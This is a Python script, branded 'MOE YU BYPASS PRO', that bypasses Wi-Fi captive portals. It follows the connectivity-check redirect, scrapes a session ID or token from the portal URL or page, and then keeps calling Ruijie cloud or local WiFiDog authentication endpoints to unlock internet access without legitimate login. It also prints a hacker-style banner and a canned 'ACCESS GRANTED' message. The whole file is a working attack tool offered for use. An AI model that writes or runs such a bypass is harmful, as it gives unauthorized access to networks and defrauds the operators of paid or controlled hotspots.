import requests
import re
import urllib3
import time
import threading
import sys
import os
import uuid
import random
import socket
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# တည်ငြိမ်မှုအတွက် Setting များ
PING_THREADS = 1 
PING_INTERVAL = 2.0 

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Let's Play! )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-998A7F92-675"

def get_current_gateway():
    """System command မလိုဘဲ Gateway ကို socket ဖြင့် ရှာဖွေခြင်း"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return ".".join(local_ip.split('.')[:-1]) + ".1"
    except:
        return "192.168.110.1"

def hacker_typing(text, style="bold green"):
    console.print("[bold #00FF00]>>> [/bold #00FF00]", end="")
    for char in text:
        console.print(Text(char, style=style), end="")
        sys.stdout.flush()
        time.sleep(0.02)
    console.print()

# ===============================
# BYPASS ENGINE
# ===============================
def start_bypass_process():
    while True:
        try:
            session = requests.Session()
            # အင်တာနက်မရှိချိန်မှာ Redirect ကို အဆုံးထိလိုက်ရန်
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            portal_url = r.url
            r1 = session.get(portal_url, timeout=10, verify=False)
            
            # --- SID/TOKEN PARSING (Cloud & Local) ---
            params = parse_qs(urlparse(portal_url).query)
            sid = (params.get('sessionId') or params.get('session_id') or 
                   params.get('token') or params.get('auth_id') or [None])[0]
            
            # HTML Body ထဲတွင်ပါ ထပ်ရှာခြင်း
            if not sid:
                sid_match = re.search(r'(?:sessionId|session_id|token|auth_id)=([a-zA-Z0-9_\-]+)', r1.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                current_gw = get_current_gateway()
                
                # Cloud Portal သို့မဟုတ် Local Router ခွဲခြားခြင်း
                if "ruijienetworks.com" in portal_url:
                    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
                    mode = "RUIJIE-CLOUD"
                else:
                    auth_link = f"http://{current_gw}:2060/wifidog/auth?token={sid}"
                    mode = "LOCAL-BYPASS"
                
                def pulse():
                    while True:
                        try:
                            session.get(auth_link, timeout=10)
                            sys.stdout.write(f"{GREEN}[✓] {mode} | SID: {sid[:10]}... | ACTIVE{RESET}\n")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(PING_INTERVAL)

                threading.Thread(target=pulse, daemon=True).start()
                
                while True:
                    try:
                        if session.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(15)
                        else: break
                    except: break
            else:
                sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. RETRYING...{RESET}\n")
                time.sleep(3)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    
    my_hwid = get_hwid()
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="cyan", expand=False)))
    
    hacker_typing("INITIALIZING SYSTEM COMPONENTS...")
    hacker_typing(f"DETECTED GATEWAY: {get_current_gateway()}")
    hacker_typing("AUTHENTICATION SUCCESS: ACCESS GRANTED")
    
    console.print(Panel.fit("[bold red]🔥 MOE YU BYPASS PRO v7.8 IS RUNNING 🔥[/bold red]", border_style="white"))
    
    try:
        start_bypass_process()
    except KeyboardInterrupt:
        sys.exit()
